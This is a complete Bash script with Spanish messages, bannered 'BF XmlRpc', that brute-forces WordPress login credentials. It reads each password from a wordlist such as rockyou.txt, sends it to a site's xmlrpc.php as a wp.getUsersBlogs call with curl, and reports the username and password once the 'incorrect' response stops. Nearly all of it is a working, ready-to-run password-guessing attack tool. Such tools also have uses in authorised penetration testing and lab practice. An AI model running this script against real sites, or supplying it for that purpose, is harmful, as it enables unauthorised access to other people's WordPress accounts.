#!/bin/bash

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
orangeColour="\e[38;5;214m\033[1m"
darkRedColour="\e[38;5;124m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  [ -e fuerza_bruta.xml ] && rm fuerza_bruta.xml -f
  tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

function cerrar_flujo(){
  [ -e fuerza_bruta.xml ] && rm fuerza_bruta.xml -f
  tput cnorm; exit 1
}

function panel(){
  echo -e "${redColour}"
  cat << "EOF"

   _______   ________        __    __                __  _______                      
  |       \ |        \      |  \  |  \              |  \|       \                     
  | $$$$$$$\| $$$$$$$$      | $$  | $$ ______ ____  | $$| $$$$$$$\  ______    _______ 
  | $$__/ $$| $$__           \$$\/  $$|      \    \ | $$| $$__| $$ /      \  /       \
  | $$    $$| $$  \           >$$  $$ | $$$$$$\$$$$\| $$| $$    $$|  $$$$$$\|  $$$$$$$
  | $$$$$$$\| $$$$$          /  $$$$\ | $$ | $$ | $$| $$| $$$$$$$\| $$  | $$| $$      
  | $$__/ $$| $$            |  $$ \$$\| $$ | $$ | $$| $$| $$  | $$| $$__/ $$| $$_____ 
  | $$    $$| $$            | $$  | $$| $$ | $$ | $$| $$| $$  | $$| $$    $$ \$$     \
   \$$$$$$$  \$$             \$$   \$$ \$$  \$$  \$$ \$$ \$$   \$$| $$$$$$$   \$$$$$$$
                                                                  | $$                
                                                                  | $$                
                                                                   \$$                
EOF
echo -e "${endColour}"
}

function helpPanel(){

  echo -e "\n\t${yellowColour}[+]${endColour} ${grayColour}Uso:${endColour}\n"
  echo -e "\t\t${purpleColour}d)${endColour} ${grayColour}Especificar la dirección IP${endColour}"
  echo -e "\t\t${purpleColour}u)${endColour} ${grayColour}Especificar el nombre del usuario${endColour}"
  echo -e "\t\t${purpleColour}w)${endColour} ${grayColour}Especificar la ruta al diccionario con el que aplicar fuerza bruta${endColour}"
  echo -e "\t\t${purpleColour}i)${endColour} ${grayColour}Mostrar una barra de progreso informativa. (El tiempo de ejecución podría verse afectado)${endColour}\n"
  echo -e "\t\t\t${yellowColour}[+]${endColour}${turquoiseColour} Ejemplo -> \t ${endColour} ${orangeColour}$0${endColour} ${purpleColour}-d${endColour} ${grayColour}http://127.0.0.1/wordpress${endColour} ${purpleColour}-w${endColour}${grayColour} /usr/share/wordlists/rockyou.txt${endColour} ${purpleColour}-u${endColour} ${grayColour}pepe${endColour}\n"
}

function createXML(){

  password="$1"

  xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>$username</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""

  echo $xmlFile > fuerza_bruta.xml

  response="$(curl -s -X POST "${url}" -d@fuerza_bruta.xml | grep -oP "<string>\K.*(?=</string>)" | grep -i "incorrect")"

 if [ -z "$response" ]; then
      echo -e "\n\n\n${yellowColour}[+]${endColour} ${greenColour} Credencilales encontradas -> ${endColour}${blueColour}${username}${endColour}${grayColour}:${endColour}${blueColour}${linea}${endColour}\n"
      cerrar_flujo
 fi
}

function show_progress(){
  total=$1
  current=$2
  #percent=$(echo "scale=2; $current * 100 / $total" | bc)
  percent=$(LC_NUMERIC=C printf "%.2f" $(echo "scale=2; $current * 100 / $total" | bc))

  echo -ne "\e[?25l\r\033[K${yellowColour}    ${current}/${total} (${percent}%)${endColour}"
}

function brute_force(){
  tput civis
  url="$1"
  username="$2"
  wordlist="$3"
  show_progress="$4"

  if [ ! -e "$wordlist" ]; then
    echo -e "\n${redColour}[!] No existe el diccionario ${endColour}${blueColour}$wordlist${endColour}\n"
    cerrar_flujo
  fi

  if [ ! -r "$wordlist" ]; then
    echo -e "\n${redColour}[!] No tienes capacidad de lectura sobre el archivo ${endColour}${yellowColour}${wordlist}${endColour}\n"
    cerrar_flujo
  fi

  url_checker="$(curl -s -X GET "${url}")"

  if [ -z "$url_checker" ]; then
    echo -e "\n${redColour}[!] No existe la URL ${endColour}${blueColour}$url${endColour}\n"
    cerrar_flujo
  fi

  # Añadimos / si no lo tiene
  checker_final_slash=${url: -1}
  if [ ! "$checker_final_slash" == "/" ]; then
    url+="/"
  fi

  url+="xmlrpc.php"

  xmlrpc_checker="$(curl -s -o /dev/null -w %{HTTP_CODE} -X POST "${url}")"

  if [ $xmlrpc_checker -ne 200 ]; then
    echo -e "${redColour}[!] En esta dirección ${endColour}${yellowColour}${1}${endColour}${redColour} no está alojado un WordPress o no está expuesto el archivo${endColour} ${yellowColour}xmlrpc.php${endColor}"
    cerrar_flujo
  fi

  echo -e "${grayColour}[${endColour}${blueColour}*${endColour}${grayColour}] Username:${endColour} ${blueColour}$username${endColour}"
  echo -e "${grayColour}[${endColour}${blueColour}*${endColour}${grayColour}] Wordlist:${endColour} ${blueColour}$wordlist${endColour}"

  if [ $show_progress -eq 1 ]; then
    echo -e "${grayColour}[${endColour}${yellowColour}i${endColour}${grayColour}] Status: ${endColour}"
    wordlist_lines=$(wc -l < $wordlist)
    line=0
  fi
 
 
  while IFS= read -r linea; do

    if [ $show_progress -eq 1 ]; then
      line=$((line + 1))
      show_progress $wordlist_lines $line
    fi
    createXML $linea 

  done < <(cat "$wordlist")

  echo -e "\n\n${yellowColour}[+]${endColour} ${grayColour}No se han encontrado credenciales válidas para el usuario ${endColour}${blueColour}${username}${endColour}\n"

  [ -e fuerza_bruta.xml ] && rm fuerza_bruta.xml -f
  tput cnorm
}

# Indicadores
declare -i url_indicador=0
declare -i wordlist_indicador=0
declare -i username_indicador=0
declare -i info_indicador=0

panel; while getopts ":d:u:w:ih" arg; do
  case $arg in
    h) ;;
    d) url="$OPTARG"; let url_indicador+=1 ;;
    w) wordlist="$OPTARG"; let wordlist_indicador+=1 ;;
    u) username="$OPTARG"; let username_indicador+=1 ;;
    i) let info_indicador+=1 ;;
   \?) 
     echo -e "\n${redColour}[!] Parámetro inválido${endColour}"
     helpPanel
     cerrar_flujo
     ;;
    :)
      case "$OPTARG" in
        d)
          echo -e "\n${redColour}[!] Ingresa la dirección URL${endColour}"
          echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Uso:${endColour}"
          echo -e "\t${orangeColour}$0${endColour} ${purpleColour}-d ${endColour}${greenColour}http://ejemplo.com${endColour}"
          cerrar_flujo
          ;;
        w)
          echo -e "\n${redColour}[!] Ingresa la ruta al Diccionario de Fuerza Bruta${endColour}"
          echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Uso:${endColour}"
          echo -e "\t${orangeColour}$0${endColour} ${purpleColour}-w ${endColour}${greenColour}/usr/share/wordlists/rockyou.txt${endColour}"
          cerrar_flujo
          ;;
        u)
          echo -e "\n${redColour}[!] Ingresa el nombre de usuario${endColour}"
          echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Uso:${endColour}"
          echo -e "\t${orangeColour}$0${endColour} ${purpleColour}-u ${endColour}${greenColour}pepe${endColour}"
          cerrar_flujo
          ;;
      esac
  esac
done


if [ $url_indicador -eq 0 ]; then
  echo -ne "\n${redColour}[!] Debes introducir la dirección URL${endColour}\n"
fi

if [ $username_indicador -eq 0 ]; then
  echo -ne "\n${redColour}[!] Debes introducir el nombre de usuario${endColour}\n"
fi

if [ $wordlist_indicador -eq 0 ]; then
  echo -ne "\n${redColour}[!] Debes introducir la ruta al Diccionario de Fuerza Bruta${endColour}\n"
fi

if [ $url_indicador -eq 1 ] && [ $username_indicador -eq 1 ] && [ $wordlist_indicador -eq 1 ]; then
  brute_force $url $username $wordlist $info_indicador
else
  helpPanel
  cerrar_flujo
fi
